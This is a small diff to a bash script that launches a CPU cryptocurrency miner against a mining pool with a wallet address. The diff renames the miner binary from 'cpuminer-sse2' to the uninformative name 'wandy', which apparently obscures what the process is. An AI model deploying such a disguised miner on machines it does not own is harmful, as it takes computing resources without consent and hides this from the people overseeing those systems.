@@ -1,6 +1,6 @@
 #!/bin/bash
 
 
-chmod +x cpuminer-sse2
+chmod +x wandy
 
-./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BbCydmWdNhpUYgmsqnSYiw7Fe4s8jpxy8A.myworker
+./wandy -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BbCydmWdNhpUYgmsqnSYiw7Fe4s8jpxy8A.myworker
